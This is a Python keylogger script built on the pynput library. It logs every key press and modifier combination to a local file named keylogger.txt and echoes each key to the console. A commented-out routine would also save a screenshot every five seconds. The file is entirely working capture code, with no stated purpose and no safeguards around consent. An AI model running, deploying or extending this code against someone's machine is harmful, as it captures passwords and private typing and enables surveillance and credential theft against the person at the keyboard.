import pynput
from pynput.keyboard import Key, Listener
import logging
# import mss
# import time

# Set the screenshot directory
screenshot_dir = "screenshots/"
screenshot_count = 0

# Clear the contents of keylogger.txt at the start
with open("keylogger.txt", "w"):
    pass

# Define the location of the keylog
keylogger_filename = r"keylogger.txt"
# Define the format of the keylog
logging.basicConfig(filename=keylogger_filename, level=logging.DEBUG, format="%(message)s")

# Track the state of modifier keys
modifier_keys = {
    Key.ctrl_l: False,
    Key.ctrl_r: False,
    Key.shift: False,
    Key.shift_r: False,
    Key.alt: False
}

# Generate control character mappings (Ctrl + A to Ctrl + Z)
control_character_map = {chr(i): f"{chr(i + 64)}" for i in range(1, 27)}

def interpret_control_key(key):
    """Convert a control character to a readable format if it's in the control character map."""
    if hasattr(key, 'char') and key.char in control_character_map:
        return control_character_map[key.char]
    return str(key)  # Fallback for any key not in the map

def on_press(key):
    if key == Key.esc:
        return False
    # Detect if it's a modifier key and update its state
    if key in modifier_keys:
        modifier_keys[key] = True
    else:
        # Check for active modifiers
        active_modifiers = [str(k) for k, v in modifier_keys.items() if v]
        
        if active_modifiers:
            # Interpret control key combinations
            key_str = interpret_control_key(key)
            combination = " + ".join(active_modifiers) + " + " + str(key_str).strip("'")
            print(f"Combination pressed: {combination}")
            logging.info(combination)
        else:
            # Determine the key representation
            if hasattr(key, 'char') and key.char is not None:
                key_str = key.char  # Get the character directly
            else:
                key_str = str(key)  # For special keys (e.g., Key.enter, Key.shift, etc.)

            print("Single key pressed: " + key_str)
            logging.info(key_str)

def on_release(key):
    # Reset the specific modifier state when it’s released
    if key in modifier_keys:
        modifier_keys[key] = False

# def take_screenshot():
#     # Use a context manager to automatically clean up resources
#     with mss.mss() as sct:
#         while True:
#             # Capture the screen
#             screenshot = sct.shot(output=f"{screenshot_dir}screenshot_{screenshot_count}.png")
#             print(f"Screenshot {screenshot_count} taken and saved as {screenshot}")

#             screenshot_count += 1
#             time.sleep(5)  # Wait for 5 seconds before taking the next screenshot

# Listen for keyboard events and call on_press/on_release whenever a key is pressed/released
with Listener(on_press=on_press, on_release=on_release) as listener:
    # take_screenshot()
    listener.join()
